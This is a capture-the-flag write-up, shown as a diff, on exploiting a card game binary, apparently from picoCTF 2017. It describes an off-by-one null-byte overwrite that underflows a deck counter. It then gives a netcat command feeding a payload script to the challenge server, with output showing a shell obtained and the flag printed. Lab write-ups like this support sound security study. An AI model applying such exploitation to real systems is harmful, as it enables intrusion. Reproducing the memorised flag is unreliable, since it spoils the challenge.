@@ -1,0 +1,37 @@
+Inspecting the source code, we find the function readInput() used to read input.
+At the end, it adds a NULL byte to the end of the buffer, which is supposed to terminate the string.
+However, if we input 32 characters, the program will add the null byte past the name
+buffer and overwrite deckSize to 0.
+
+        //TODO: Implement card switching hands. Cheap hack here for playability
+        gameData.deckSize--;
+        if(gameData.deckSize == 0){
+            printf("All card used. Card switching will be implemented in v1.0, someday.\n");
+            exit(0);
+        }
+Since the program decrements the deck size by one before checking its value, the deckSize
+will be set to -1.  The program only checks if deckSize is equal to zero, so negative numbers will allow us to
+keep playing the game past the initial cards, and eventually into the name buffer.
+
+We need to set our name to something with characters less than or equal to \x04, since the
+checkInvalidCard() function will check if our suit value is greater than 4.
+Keep betting small amounts of money to go past the initial deck and into the name buffer.
+
+$ cat <(python payload.py) - | nc shell2017.picoctf.com 32251
+...
+You have 384 coins.
+How much would you like to bet?
+you bet 384.
+The opponent has a 0 of suit 0.
+You have a 4 of suit 4.
+You won? Hmmm something must be wrong...
+You actually won! Nice job
+You won the game! That's real impressive, seeing as the deck was rigged...
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+flag.txt
+war
+war_no_aslr
+xinetd_wrapper.sh
+$ cat flag.txt
+5f28113500ed744dea5b22743db9b9b6
